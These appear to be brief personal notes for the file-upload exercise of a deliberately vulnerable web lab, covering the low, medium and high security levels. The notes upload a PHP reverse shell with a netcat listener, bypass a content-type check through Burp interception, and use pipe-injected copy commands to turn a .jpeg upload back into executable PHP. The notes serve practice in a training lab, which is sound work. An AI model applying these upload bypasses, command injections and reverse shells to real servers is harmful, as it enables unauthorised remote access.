on low security:

    using https://github.com/pentestmonkey/php-reverse-shell

    lets make a listener with $ nc -nvlp 5555
        
    lets upload that shell.php file -> http://<VICTIM IP>/hackable/uploads/shell.php -> we are in as nobody user

for medium security:

    we will use burp suite as a proxy, change content type of the file and forward edited request to the webpage

    before clicking upload -> turn on intercept -> chenge content type -> turn intercept off
    
    works

for high security:

    cp shell.php shell.jpeg


    do the following in command execution section on mid security:
        |ls /opt/lampp/htdocs/hackable/uploads
        |cp /opt/lampp/htdocs/hackable/uploads/shell.jpeg /opt/lampp/htdocs/hackable/uploads/shell.php

    and finally: http://192.168.199.52/hackable/uploads/shell.php
